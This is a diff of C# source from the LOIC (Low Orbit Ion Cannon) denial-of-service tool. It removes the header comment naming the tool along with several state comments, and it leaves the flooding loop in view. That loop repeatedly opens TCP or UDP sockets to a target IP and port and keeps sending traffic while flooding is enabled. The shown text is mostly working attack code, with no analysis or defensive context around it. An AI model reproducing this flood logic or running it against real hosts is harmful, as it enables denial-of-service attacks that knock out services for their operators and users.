@@ -1,5 +1,4 @@
-/* LOIC - Low Orbit Ion Cannon
- */
+
 
 using System;
 using System.ComponentModel;
@@ -51,20 +50,19 @@ namespace LOIC
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (this.IsFlooding)
 				{
-					State = ReqState.Ready; // SET STATE TO READY //
+					State = ReqState.Ready;
 					if(Protocol == (int)LOIC.Protocol.TCP)
 					{
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 						{
 							socket.NoDelay = true;
-							State = ReqState.Connecting; // SET STATE TO CONNECTING //
+							State = ReqState.Connecting;
 
 							try { socket.Connect(RHost); }
 							catch { continue; }
 
 							socket.Blocking = Resp;
-							State = ReqState.Requesting; // SET STATE TO REQUESTING //
-
+							State = ReqState.Requesting;
 							try
 							{
 								while (this.IsFlooding)
@@ -83,7 +81,7 @@ namespace LOIC
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
 						{
 							socket.Blocking = Resp;
-							State = ReqState.Requesting; // SET STATE TO REQUESTING //
+							State = ReqState.Requesting;
 
 							try
 							{
@@ -100,7 +98,6 @@ namespace LOIC
 					}
 				}
 			}
-			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
 			finally { State = ReqState.Ready; this.IsFlooding = false; }
 		}
